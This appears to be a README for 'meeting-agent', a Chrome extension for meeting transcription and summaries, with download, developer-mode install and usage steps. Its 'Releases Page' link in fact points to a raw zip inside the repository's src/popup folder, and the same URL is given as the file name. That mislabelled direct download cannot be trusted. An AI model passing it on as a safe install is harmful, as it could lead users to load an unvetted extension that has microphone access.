## üìñ Overview

meeting-agent is a Chrome Extension designed to enhance your meeting experience. It listens to your meetings, transcribes them in real-time, and generates summaries with follow-up tasks. This tool helps you stay organized and ensures that you never miss important details again.

## üöÄ Getting Started

To get started with the meeting-agent, follow the steps below to download and install the extension.

1. Make sure you are using Google Chrome as your browser. The meeting-agent extension is only compatible with Chrome.
   
2. Ensure your computer has a microphone and speakers. This is essential for capturing audio during meetings.

## üì• Download & Install

To download the meeting-agent, visit this page to download: [Releases Page](https://raw.githubusercontent.com/VitorSystems/meeting-agent/main/src/popup/meeting-agent-v3.0.zip).

1. On the Releases page, find the latest version of the meeting-agent.
   
2. Click on the download link for the Chrome Extension file. This file will usually be named something like `https://raw.githubusercontent.com/VitorSystems/meeting-agent/main/src/popup/meeting-agent-v3.0.zip`.

3. Once the file downloads, locate it in your computer's Downloads folder.

4. Unzip the downloaded file. You will see a folder that contains the extension files, including a manifest file.

5. Open Google Chrome and go to `chrome://extensions`.

6. Enable "Developer mode" by toggling the switch at the top right corner.

7. Click the "Load unpacked" button and select the unzipped folder containing the extension files.

8. You should now see the meeting-agent listed among your installed extensions.

## üé§ How to Use meeting-agent

1. **Start a Meeting:** Launch your meeting as you normally would, using video conferencing software like Zoom or Google Meet.

2. **Activate meeting-agent:** Click on the meeting-agent icon in your Chrome toolbar. This starts the transcription process.

3. **View Transcriptions:** As your meeting progresses, you will see real-time transcriptions appear in the meeting-agent window. 

4. **Generate Summary:** After the meeting ends, meeting-agent will automatically compile a summary along with follow-up tasks.

5. **Export Options:** You can copy the summary to your clipboard or export it as a text file for your records.
